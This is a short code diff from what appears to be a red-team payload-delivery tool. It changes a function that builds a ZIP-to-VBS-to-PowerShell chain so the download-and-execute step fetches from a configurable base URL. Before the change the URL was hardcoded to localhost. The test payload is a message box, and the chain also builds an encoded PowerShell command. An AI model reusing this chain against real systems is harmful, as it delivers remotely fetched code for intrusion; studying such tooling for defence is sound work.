@@ -15,7 +15,7 @@ from model import AceFile, AceRoute
 from web import serve
 
 
-def recipe2() -> List[AceRoute]:
+def recipe2(baseUrl) -> List[AceRoute]:
     # ZIP -> VBS -> Powershell:Download+Exec <- Powershell-Messagebox
     routes = []
 
@@ -26,7 +26,7 @@ def recipe2() -> List[AceRoute]:
 
     # PS Download & Execute
     psCommand: AceStr = makePsScriptFromPsCommandByDownloadMem(
-        url='http://localhost:5000/ps-msgbox',
+        url=baseUrl+'/ps-msgbox',
     )
     psEncodedCommand: AceStr = makePsEncodedCommand(psCommand)
 
